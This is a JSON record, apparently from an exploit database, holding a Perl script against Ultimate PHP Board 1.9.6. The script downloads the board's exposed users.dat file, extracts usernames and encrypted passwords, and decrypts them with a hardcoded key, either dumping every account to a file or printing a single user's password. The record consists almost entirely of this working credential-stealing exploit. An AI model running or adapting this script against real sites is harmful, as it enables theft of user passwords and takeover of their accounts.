{
  "id": "1051",
  "title": "Ultimate PHP Board 1.9.6 GOLD - users.dat Password Decryptor",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# Passwords Decrypter for UPB <= 1.9.6\r\n# Related advisory: http://www.securityfocus.com/archive/1/402461/30/0/threaded\r\n# Discovered and Coded by Alberto Trivero\r\n\r\n# Password file is located at: http://www.example.com/upb/db/users.dat   /str0ke\r\n\r\n\r\nuse Getopt::Std;\r\nuse LWP::Simple;\r\ngetopt('hfu');\r\n\r\nprint \"\\n\\t========================================\\n\";\r\nprint \"\\t= Passwords Decrypter for UPB <= 1.9.6 =\\n\";\r\nprint \"\\t=          by Alberto Trivero          =\\n\";\r\nprint \"\\t========================================\\n\\n\";\r\n\r\nif(!$opt_h or !($opt_f or $opt_u) or ($opt_f && $opt_u)) {\r\n   print \"Usage:\\nperl $0 -h [full_target_path] [-f [output_file_name] OR -u [username]]\\n\\n\";\r\n   print \"Examples:\\nperl $0 -h http://www.example.com/upb/ -f results.txt\\n\";\r\n   print \"perl $0 -h http://www.example.com/upb/ -u Alby\\n\";\r\n   exit(0);\r\n}\r\n\r\n$key=\"wdnyyjinffnruxezrkowkjmtqhvrxvolqqxokuofoqtneltaomowpkfvmmogbayankrnrhmbduzfmpctxiidweripxwglmwrmdscoqyijpkzqqzsuqapfkoshhrtfsssmcfzuffzsfxdwupkzvqnloubrvwzmsxjuoluhatqqyfbyfqonvaosminsxpjqebcuiqggccl\";\r\n$page=get($opt_h.\"db/users.dat\") || die \"[-] Unable to retrieve: $!\";\r\nprint \"[+] Connected to: $opt_h\\n\";\r\n@page=split(/\\n/,$page);\r\n\r\nif($opt_f) {\r\n   open(RESULTS,\"+>$opt_f\") || die \"[-] Unable to open $opt_f: $!\";\r\n   print RESULTS \"Results for $opt_h\\n\",\"=\"x40,\"\\n\\n\";\r\n   for($in=0;$in<@page;$in++) {\r\n      $page[$in]=~m/^(.*?)<~>/ && print RESULTS \"Username: $1\\n\";\r\n      $page[$in]=~m/^$1<~>(.*?)<~>/ && print RESULTS \"Crypted Password: $1\\n\";\r\n      &decrypt;\r\n      print RESULTS \"Decrypted Password: $crypt\\n\\n\";\r\n      $crypt=\"\";\r\n   }\r\n   close(RESULTS);\r\n   print \"[+] Results printed correct in: $opt_f\\n\";\r\n}\r\n\r\nif($opt_u) {\r\n   for($in=0;$in<@page;$in++) {\r\n      if($page[$in]=~m/^$opt_u<~>(.*?)<~>/) {\r\n        print \"[+] Username: $opt_u\\n\";\r\n        print \"[+] Crypted Password: $1\\n\";\r\n         &decrypt;\r\n         print \"[+] Decrypted Password: $crypt\\n\";\r\n         exit(0);\r\n      }\r\n   }\r\n   print \"[-] Username '$opt_u' doesn't exist\\n\";\r\n}\r\n\r\nsub decrypt {\r\n   for($i=0;$i<length($1);$i++) {\r\n      $i_key=ord(substr($key, $i, 1));\r\n      $i_text=ord(substr($1, $i, 1));\r\n      $n_key=ord(substr($key, $i+1, 1));\r\n      $i_crypt=$i_text + $n_key;\r\n      $i_crypt-=$i_key;\r\n      $crypt.=chr($i_crypt);\r\n   }\r\n}\r\n\r\n# milw0rm.com [2005-06-16]",
  "url": "https://www.exploit-db.com/exploits/1051"
}